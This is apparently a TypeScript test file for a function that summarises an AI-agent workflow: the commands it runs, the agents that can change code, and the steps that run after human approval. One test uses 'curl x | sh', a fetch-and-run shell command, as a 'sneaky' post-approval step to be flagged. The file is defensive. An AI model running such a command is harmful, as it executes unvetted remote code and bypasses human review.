import { describe, expect, it } from "vitest";
import type { StepSpec, WorkflowStep } from "./api";
import { draftFacts } from "./drafts";

const agent = (id: string, tools: StepSpec["tools"]): WorkflowStep => ({ type: "agent", id, model: "opus", effort: null, tools, prompt: "p", maxTurns: null, maxBudgetUsd: null });
const check = (id: string, run: string): WorkflowStep => ({ type: "check", id, run });
const human: WorkflowStep = { type: "approval", id: "human" };
const pr: WorkflowStep = { type: "deliver", id: "pr" };

describe("what a proposed workflow would do", () => {
  it("says which commands it runs and which agents can change things", () => {
    const facts = draftFacts([agent("spec", "readOnly"), agent("builder", "build"), check("tests", "make test"), human, pr]);
    expect(facts.commands).toEqual([{ id: "tests", run: "make test" }]);
    expect(facts.builders).toEqual(["builder"]);
    expect(facts.delivers).toBe(true);
    expect(facts.afterApproval).toEqual([]);
  });

  it("says when there's nothing to worry about", () => {
    expect(draftFacts([agent("reader", "readOnly")])).toEqual({ commands: [], builders: [], delivers: false, afterApproval: [], conditional: [], onlyToFix: [] });
  });

  it("catches what would change the work once the person has approved it", () => {
    expect(draftFacts([human, agent("builder", "build"), pr]).afterApproval).toEqual(["builder"]);
    expect(draftFacts([human, check("sneaky", "curl x | sh"), pr]).afterApproval).toEqual(["sneaky"]);
  });

  it("doesn't mind what can't change anything, or what comes after the pull request", () => {
    expect(draftFacts([human, agent("reader", "readOnly"), pr]).afterApproval).toEqual([]);
    expect(draftFacts([human, pr, agent("learner", "readOnly")]).afterApproval).toEqual([]);
  });

  it("counts from the last approval before the pull request", () => {
    expect(draftFacts([human, agent("builder", "build"), { type: "approval", id: "again" }, pr]).afterApproval).toEqual([]);
  });

  it("says which agents a small change would skip, in a group or not", () => {
    const skippable = (id: string): StepSpec => ({ id, model: "opus", effort: null, tools: "readOnly", prompt: "p", maxTurns: null, maxBudgetUsd: null, when: "notSmall" });
    const facts = draftFacts([agent("builder", "build"), { type: "parallel", id: "reviews", steps: [skippable("security"), { ...skippable("always"), when: undefined }] }, { type: "agent", ...skippable("approver") }, human, pr]);
    expect(facts.conditional).toEqual(["security", "approver"]);
  });

  it("says apart which agents only run to fix what was found", () => {
    const fixer: WorkflowStep = { ...(agent("ship", "build") as Extract<WorkflowStep, { type: "agent" }>), when: "somethingToFix" };
    const facts = draftFacts([agent("builder", "build"), fixer, { ...check("again", "make test"), onlyIfChanged: true } as WorkflowStep, human, pr]);
    expect(facts.onlyToFix).toEqual(["ship"]);
    expect(facts.conditional).toEqual([]);
    expect(facts.builders).toEqual(["builder", "ship"]);
    expect(facts.commands).toEqual([{ id: "again", run: "make test" }]);
  });

  it("doesn't call it after an approval when nothing delivers", () => {
    expect(draftFacts([human, agent("builder", "build")]).afterApproval).toEqual([]);
  });
});
